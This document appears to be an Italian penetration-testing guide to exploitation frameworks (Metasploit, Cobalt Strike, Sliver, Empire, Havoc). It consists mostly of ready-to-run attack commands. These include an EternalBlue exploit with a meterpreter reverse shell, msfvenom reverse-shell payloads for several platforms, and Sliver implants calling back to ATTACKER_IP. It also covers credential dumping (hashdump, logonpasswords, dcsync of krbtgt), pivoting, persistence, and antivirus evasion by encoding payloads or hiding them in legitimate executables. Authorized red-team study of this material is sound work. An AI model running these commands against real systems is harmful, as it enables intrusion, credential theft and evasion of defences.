# Exploitation Frameworks

## Scopo

Questa guida copre i principali framework di exploitation per penetration testing, dalla configurazione all'uso pratico di Metasploit, Cobalt Strike e alternative open source.

## Prerequisiti

- Kali Linux o sistema compatibile
- Conoscenza networking
- Comprensione vulnerabilità
- **Autorizzazione per testing**

---

## Metasploit Framework

### Installazione e Setup

```bash
# Kali (preinstallato)
msfconsole

# Altre distro
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Inizializza database
msfdb init
msfdb start
```

### Comandi Base

```bash
# Avvio
msfconsole

# Ricerca moduli
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2021

# Info modulo
msf6 > info exploit/windows/smb/ms17_010_eternalblue

# Usa modulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Opzioni
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.10.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

### Meterpreter

```bash
# Comandi base
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps

# File system
meterpreter > pwd
meterpreter > ls
meterpreter > cd
meterpreter > download file.txt
meterpreter > upload payload.exe

# Privilege escalation
meterpreter > getsystem
meterpreter > run post/multi/recon/local_exploit_suggester

# Credential access
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector

# Pivoting
meterpreter > run autoroute -s 192.168.1.0/24
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.10

# Persistence
meterpreter > run persistence -h

# Shell
meterpreter > shell
meterpreter > execute -f cmd.exe -i -H
```

### Payload Generation

```bash
# msfvenom
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

# Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.jsp

# Encoded
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x64/xor -i 5 -f exe > encoded.exe

# Shellcode
msfvenom -p windows/x64/exec CMD=calc.exe -f c
```

### Handler

```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 0.0.0.0
msf6 > set LPORT 4444
msf6 > set ExitOnSession false
msf6 > run -j
```

### Database

```bash
# Workspace
msf6 > workspace -a project1
msf6 > workspace project1

# Hosts
msf6 > hosts
msf6 > hosts -a 10.10.10.10

# Services
msf6 > services

# Vulnerabilities
msf6 > vulns

# Import
msf6 > db_import nmap_scan.xml
```

---

## Cobalt Strike

### Setup

```bash
# Server (Team Server)
./teamserver IP shared_password

# Client
./cobaltstrike
# Connect to team server
```

### Listeners

```
Cobalt Strike > Listeners > Add

Types:
- HTTP/HTTPS
- DNS
- SMB
- TCP
```

### Payloads

```
Attacks > Packages:
- Windows Executable
- Windows Executable (S)
- PowerShell
- Raw Shellcode

Attacks > Web Drive-by:
- Scripted Web Delivery
- Signed Applet Attack
```

### Beacon Commands

```
beacon> help

# Execution
beacon> shell whoami
beacon> powershell Get-Process
beacon> execute-assembly tool.exe

# File operations
beacon> upload file.txt
beacon> download C:\file.txt
beacon> ls

# Credential access
beacon> hashdump
beacon> logonpasswords
beacon> dcsync DOMAIN\krbtgt

# Lateral movement
beacon> jump psexec TARGET LISTENER
beacon> jump winrm TARGET LISTENER
beacon> remote-exec psexec TARGET cmd

# Pivoting
beacon> socks 1080
beacon> rportfwd 8080 127.0.0.1 80
```

### Malleable C2

```c
# Profile per evasion
http-get {
    set uri "/api/v1/data";
    client {
        header "Accept" "application/json";
        metadata {
            base64url;
            prepend "auth=";
            header "Cookie";
        }
    }
    server {
        output {
            print;
        }
    }
}
```

---

## Sliver

### Setup

```bash
# Install
curl https://sliver.sh/install | sudo bash

# Start
sliver-server

# O via systemd
systemctl start sliver
```

### Listeners

```bash
sliver > http
sliver > https
sliver > mtls
sliver > dns -d example.com
sliver > wg
```

### Implant Generation

```bash
# Beacon (async)
sliver > generate beacon --http ATTACKER_IP --save /tmp/beacon

# Session (sync)
sliver > generate --mtls ATTACKER_IP --save /tmp/implant

# Opzioni
sliver > generate beacon --http ATTACKER_IP --os windows --arch amd64 --format exe --save /tmp/beacon.exe

# Evasion
sliver > generate beacon --http ATTACKER_IP --skip-symbols --debug
```

### Operazioni

```bash
# Lista sessioni/beacons
sliver > sessions
sliver > beacons

# Interazione
sliver > use SESSION_ID

# Comandi
sliver (BEACON) > info
sliver (BEACON) > whoami
sliver (BEACON) > pwd
sliver (BEACON) > ls
sliver (BEACON) > cd
sliver (BEACON) > download /etc/passwd
sliver (BEACON) > upload local.txt /tmp/remote.txt
sliver (BEACON) > execute -o whoami
sliver (BEACON) > shell

# Pivoting
sliver (BEACON) > socks5 start
sliver (BEACON) > portfwd add --remote 192.168.1.10:3389 --bind 127.0.0.1:3389
```

---

## Empire/Starkiller

### Setup

```bash
# PowerShell Empire
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
./setup/install.sh
./ps-empire server

# Starkiller GUI
./ps-empire client
# Access: https://localhost:1337
```

### Modules

```
# Situational awareness
powershell/situational_awareness/network/arpscan
powershell/situational_awareness/host/winenum

# Privilege escalation
powershell/privesc/powerup/allchecks

# Credential access
powershell/credentials/mimikatz/logonpasswords

# Lateral movement
powershell/lateral_movement/invoke_psexec
```

---

## Havoc

### Setup

```bash
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Build
make ts-build
make client-build

# Run
./havoc server --profile profile.yaotl
./havoc client
```

---

## Comparison

| Framework | License | Focus | Difficulty |
|-----------|---------|-------|------------|
| Metasploit | BSD | General | Easy |
| Cobalt Strike | Commercial | Red Team | Medium |
| Sliver | BSD | Modern C2 | Easy |
| Empire | BSD | PowerShell | Medium |
| Havoc | GPL | Modern | Medium |

---

## Evasion Tips

```bash
# Metasploit encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe

# Custom templates
msfvenom -p windows/meterpreter/reverse_tcp -x legitimate.exe -k -f exe

# Sleep/jitter
# Sliver
sliver > generate beacon --seconds 60 --jitter 30

# Cobalt Strike
beacon> sleep 60 30
```

---

## Best Practices

- **Authorization**: Documentazione scritta
- **OPSEC**: Minimizza detection
- **Logging**: Log tutte attività
- **Cleanup**: Rimuovi artifacts
- **Updates**: Mantieni aggiornato

## Riferimenti

- [Metasploit](https://www.metasploit.com/)
- [Sliver](https://github.com/BishopFox/sliver)
- [Cobalt Strike](https://www.cobaltstrike.com/)
- [Empire](https://github.com/BC-SECURITY/Empire)
